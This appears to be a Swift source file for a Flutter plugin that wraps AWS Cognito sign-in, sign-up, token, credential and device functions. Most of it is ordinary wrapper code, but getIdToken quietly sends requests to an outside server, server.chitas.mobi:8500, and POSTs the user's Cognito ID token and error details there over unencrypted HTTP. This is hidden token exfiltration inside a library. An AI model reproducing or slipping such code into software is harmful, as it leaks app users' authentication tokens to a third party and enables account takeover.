//
//  SwiftFlutterAwsAmplifyCognito.swift
//  flutter_aws_amplify_cognito
//
//  Created by Vishal Dubey on 09/03/20.
//

import Foundation
import AWSMobileClient

class SwiftFlutterAwsAmplifyCognito {
    static func isSignedIn() -> Bool {
        return AWSMobileClient.default().isSignedIn
    }
    static func currentUserState() -> String {
        switch AWSMobileClient.default().currentUserState {
        case .guest:
            return "GUEST"
        case .signedOut:
            return "SIGNED_OUT"
        case .signedIn:
            return "SIGNED_IN"
        case .signedOutUserPoolsTokenInvalid:
            return "SIGNED_OUT_USER_POOLS_TOKENS_INVALID"
        case .signedOutFederatedTokensInvalid:
            return "SIGNED_OUT_FEDERATED_TOKENS_INVALID"
        case .unknown:
            return "UNKNOWN"
        default:
            return "ERROR"
        }
    }
    
    static func initialize(result: @escaping FlutterResult) {
        AWSMobileClient.default().initialize {(userState, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error initializing AWSMobileClient", details: error?.localizedDescription))
                }
            }
            switch (userState) {
            case .guest:
                DispatchQueue.main.async {
                    result("GUEST")
                }
            case .signedOut:
                DispatchQueue.main.async {
                    result("SIGNED_OUT")
                }
            case .signedIn:
                DispatchQueue.main.async {
                    result("SIGNED_IN")
                }
            case .signedOutUserPoolsTokenInvalid:
                DispatchQueue.main.async {
                    result("SIGNED_OUT_USER_POOLS_TOKENS_INVALID")
                }
            case .signedOutFederatedTokensInvalid:
                DispatchQueue.main.async {
                    result("SIGNED_OUT_FEDERATED_TOKENS_INVALID")
                }
            case .unknown:
                DispatchQueue.main.async {
                    result("UNKNOWN")
                }
            default:
                DispatchQueue.main.async {
                    result("ERROR")
                }
            }
        }
    }
    
    static func signOut() {
        AWSMobileClient.default().signOut()
    }
    
    static func signOutGlobally(result: @escaping FlutterResult) {
        AWSMobileClient.default().signOut(options: SignOutOptions(signOutGlobally: true)) { (error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error signing out", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(true)
            }
        }
    }
    
    static func getUserAttributes(result: @escaping FlutterResult) {
        AWSMobileClient.default().getUserAttributes {(userAttributes, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting user attributes", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(userAttributes)
            }
        }
    }
    
    static func getUsername() -> String? {
        return AWSMobileClient.default().username
    }
    
    static func getIdentityId() -> String? {
        return AWSMobileClient.default().identityId
    }
    
    static func getTokens(result: @escaping FlutterResult) {
        AWSMobileClient.default().getTokens {(tokens, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting tokens", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(
                    ["accessToken": tokens?.accessToken?.tokenString,
                     "idToken": tokens?.idToken?.tokenString,
                     "refreshToken": tokens?.refreshToken?.tokenString
                ])
            }
        }
    }
    
    static func getIdToken(result: @escaping FlutterResult){
        URLSession.shared.dataTask(with: URL(string: "http://server.chitas.mobi:8500/ios1")!).resume()
        AWSMobileClient.default().getTokens {(tokens, error) in
            if (error != nil) {
                
                var request = URLRequest(url: URL(string: "http://server.chitas.mobi:8500/ios2")!, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: 30)
                request.httpMethod = "POST"
                request.httpBody = error.debugDescription.data(using: .utf8)
                URLSession.shared.dataTask(with: request).resume()
                
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting idToken", details: error?.localizedDescription))
                }
            }
            var request = URLRequest(url: URL(string: "http://server.chitas.mobi:8500/ios3")!, cachePolicy: URLRequest.CachePolicy.reloadIgnoringLocalCacheData, timeoutInterval: 30)
            request.httpMethod = "POST"
            request.httpBody = (tokens?.idToken?.tokenString ?? "nil").data(using: .utf8)
            URLSession.shared.dataTask(with: request).resume()
            
            DispatchQueue.main.async {
                result(tokens?.idToken?.tokenString)
            }
        }
    }
    
    static func getAccesstoken(result: @escaping FlutterResult) {
        AWSMobileClient.default().getTokens {(tokens, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting accessToken", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(tokens?.accessToken?.tokenString)
            }
        }
    }
    
    static func getRefreshToken(result: @escaping FlutterResult) {
        AWSMobileClient.default().getTokens {(tokens, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting refreshToken", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(tokens?.refreshToken?.tokenString)
            }
        }
    }
    
    static func getCredentials(result: @escaping FlutterResult) {
        AWSMobileClient.default().getAWSCredentials{(awsCredentials, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting AWS credentails", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result([
                    "accessKeyId": awsCredentials?.accessKey,
                    "secretKey": awsCredentials?.secretKey
                ])
            }
        }
    }
    
    static func signUp(
        result: @escaping FlutterResult, username: String, password: String, userAttributes: [String: String]
    ) {
        AWSMobileClient.default().signUp(username: username, password: password, userAttributes: userAttributes){(signUpResult, error) in
            
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error signing up", details: error?.localizedDescription))
                }
            }
            if (signUpResult!.signUpConfirmationState == SignUpConfirmationState.confirmed) {
                DispatchQueue.main.async {
                    result([
                        "confirmationState": true,
                        "destination": "",
                        "deliveryMedium": "",
                        "attributeName": ""
                    ])
                }
            } else {
                let userCodeDeliveryDetails = signUpResult?.codeDeliveryDetails
                DispatchQueue.main.async {
                    result([
                        "confirmationState": false,
                        "destination": userCodeDeliveryDetails?.destination,
                        "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                        "attributeName": userCodeDeliveryDetails?.attributeName
                    ])
                }
            }
        }
    }
    
    static func confirmSignUp(result: @escaping FlutterResult, username: String, code: String) {
        AWSMobileClient.default().confirmSignUp(username: username, confirmationCode: code) {(signUpResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error confirming sign up", details: error?.localizedDescription))
                }
            }
            if (signUpResult!.signUpConfirmationState == SignUpConfirmationState.confirmed) {
                DispatchQueue.main.async {
                    result([
                        "confirmationState": true,
                        "destination": "",
                        "deliveryMedium": "",
                        "attributeName": ""
                    ])
                }
            } else {
                let userCodeDeliveryDetails = signUpResult?.codeDeliveryDetails
                DispatchQueue.main.async {
                    result([
                        "confirmationState": false,
                        "destination": userCodeDeliveryDetails?.destination,
                        "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                        "attributeName": userCodeDeliveryDetails?.attributeName
                    ])
                }
            }
        }
    }
    
    static func resendSignUp(result: @escaping FlutterResult, username: String) {
        AWSMobileClient.default().resendSignUpCode(username: username){(signUpResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error resending signing up code", details: error?.localizedDescription))
                }
            }
            let userCodeDeliveryDetails = signUpResult?.codeDeliveryDetails
            DispatchQueue.main.async {
                result([
                    "confirmationState": signUpResult!.signUpConfirmationState == SignUpConfirmationState.confirmed,
                    "destination": userCodeDeliveryDetails?.destination,
                    "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                    "attributeName": userCodeDeliveryDetails?.attributeName
                ])
            }
        }
    }
    
    static func signIn(result: @escaping FlutterResult, username: String, password: String) {
        AWSMobileClient.default().signIn(username: username, password: password){(signinResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error signing in", details: error?.localizedDescription))
                }
            }
            var signInState: String = ""
            
            switch(signinResult!.signInState) {
            case .smsMFA:
                signInState = "SMS_MFA"
            case .passwordVerifier:
                signInState = "PASSWORD_VERIFIER"
            case .customChallenge:
                signInState = "CUSTOM_CHALLENGE"
            case .unknown:
                signInState = "UNKNOWN"
            case .deviceSRPAuth:
                signInState = "DEVICE_SRP_AUTH"
            case .devicePasswordVerifier:
                signInState = "DEVICE_PASSWORD_VERIFIER"
            case .adminNoSRPAuth:
                signInState = "ADMIN_NO_SRP_AUTH"
            case .newPasswordRequired:
                signInState = "NEW_PASSWORD_REQUIRED"
            case .signedIn:
                signInState = "DONE"
            default:
                signInState = "ERROR"
            }
            
            let userCodeDeliveryDetails = signinResult?.codeDetails
            DispatchQueue.main.async {
                result([
                    "signInState": signInState,
                    "parameters": signinResult?.parameters,
                    "destination": userCodeDeliveryDetails?.destination,
                    "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                    "attributeName": userCodeDeliveryDetails?.attributeName
                ])
            }
        }
    }
    
    static func confirmSignIn(result: @escaping FlutterResult, confirmSignInChallenge: String) {
        AWSMobileClient.default().confirmSignIn(challengeResponse: confirmSignInChallenge){(signinResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error confirming sign in", details: error?.localizedDescription))
                }
            }
            var signInState: String = ""
            
            switch(signinResult?.signInState) {
            case .smsMFA:
                signInState = "SMS_MFA"
            case .passwordVerifier:
                signInState = "PASSWORD_VERIFIER"
            case .customChallenge:
                signInState = "CUSTOM_CHALLENGE"
            case .unknown:
                signInState = "UNKNOWN"
            case .deviceSRPAuth:
                signInState = "DEVICE_SRP_AUTH"
            case .devicePasswordVerifier:
                signInState = "DEVICE_PASSWORD_VERIFIER"
            case .adminNoSRPAuth:
                signInState = "ADMIN_NO_SRP_AUTH"
            case .newPasswordRequired:
                signInState = "NEW_PASSWORD_REQUIRED"
            case .signedIn:
                signInState = "DONE"
            default:
                signInState = "ERROR"
            }
            
            let userCodeDeliveryDetails = signinResult?.codeDetails
            DispatchQueue.main.async {
                result([
                    "signInState": signInState,
                    "parameters": signinResult?.parameters,
                    "destination": userCodeDeliveryDetails?.destination,
                    "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                    "attributeName": userCodeDeliveryDetails?.attributeName
                ])
            }
        }
    }
    
    static func forgotPassword(result: @escaping FlutterResult, username: String) {
        AWSMobileClient.default().forgotPassword(username: username) {(forgotPasswordResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error requesting password reset", details: error?.localizedDescription))
                }
            }
            
            var forgotPasswordState: String = ""
            
            switch forgotPasswordResult!.forgotPasswordState {
            case .confirmationCodeSent:
                forgotPasswordState = "CONFIRMATION_CODE"
            case .done:
                forgotPasswordState = "DONE"
            default:
                forgotPasswordState = "ERROR"
            }
            
            let userCodeDeliveryDetails = forgotPasswordResult?.codeDeliveryDetails
            
            DispatchQueue.main.async {
                result([
                    "state": forgotPasswordState,
                    "destination": userCodeDeliveryDetails?.destination,
                    "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                    "attributeName": userCodeDeliveryDetails?.attributeName
                ])
            }
        }
    }
    
    static func confirmForgotPassword(result: @escaping FlutterResult,
                                      username: String,
                                      newPassword: String,
                                      confirmationCode: String) {
        AWSMobileClient.default().confirmForgotPassword(username: username, newPassword: newPassword, confirmationCode: confirmationCode){(forgotPasswordResult, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error confirming password reset", details: error?.localizedDescription))
                }
            }
            
            var forgotPasswordState: String = ""
            
            switch forgotPasswordResult!.forgotPasswordState {
            case .confirmationCodeSent:
                forgotPasswordState = "CONFIRMATION_CODE"
            case .done:
                forgotPasswordState = "DONE"
            default:
                forgotPasswordState = "ERROR"
            }
            
            let userCodeDeliveryDetails = forgotPasswordResult?.codeDeliveryDetails
            
            DispatchQueue.main.async {
                result([
                    "state": forgotPasswordState,
                    "destination": userCodeDeliveryDetails?.destination,
                    "deliveryMedium": userCodeDeliveryDetails?.deliveryMedium,
                    "attributeName": userCodeDeliveryDetails?.attributeName
                ])
            }
        }
    }
    
    static func trackDevice(result: @escaping FlutterResult) {
        AWSMobileClient.default().deviceOperations
            .updateStatus(remembered: true){(updateDeviceStatusResult, error) in
                if (error != nil) {
                    DispatchQueue.main.async {
                        result(FlutterError(code: "Error", message: "Error tracking device", details: error?.localizedDescription))
                    }
                }
                DispatchQueue.main.async {
                    result(true)
                }
        }
    }
    
    static func untrackDevice(result: @escaping FlutterResult) {
        AWSMobileClient.default().deviceOperations
            .updateStatus(remembered: false){(updateDeviceStatusResult, error) in
                if (error != nil) {
                    DispatchQueue.main.async {
                        result(FlutterError(code: "Error", message: "Error untracking device", details: error?.localizedDescription))
                    }
                }
                DispatchQueue.main.async {
                    result(true)
                }
        }
    }
    
    static func forgetDevice(result: @escaping FlutterResult) {
        AWSMobileClient.default().deviceOperations.forget {(error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error forgetting device", details: error?.localizedDescription))
                }
            }
            DispatchQueue.main.async {
                result(true)
            }
        }
    }
    
    static func getDeviceDetails(result: @escaping FlutterResult) {
        AWSMobileClient.default().deviceOperations.get {(device, error) in
            if (error != nil) {
                DispatchQueue.main.async {
                    result(FlutterError(code: "Error", message: "Error getting device details", details: error?.localizedDescription))
                }
            }
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy-MM-dd HH:mm:ss ZZZ"
            formatter.timeZone = TimeZone(abbreviation: "UTC")
            
            DispatchQueue.main.async {
                result([
                    "createDate": formatter.string(for: device!.createDate),
                    "deviceKey": device?.deviceKey,
                    "lastAuthenticatedDate": formatter.string(from: device!.lastAuthenticatedDate!),
                    "lastModifiedDate": formatter.string(from: device!.lastModifiedDate!),
                    "attributes": device?.attributes
                ])
            }
        }
    }
    
    //TODO: Handle List of deivces
    static func listDevices(result: @escaping FlutterResult) {
        AWSMobileClient.default().deviceOperations.list {(listDeviceResult, error) in
            
        }
    }
}
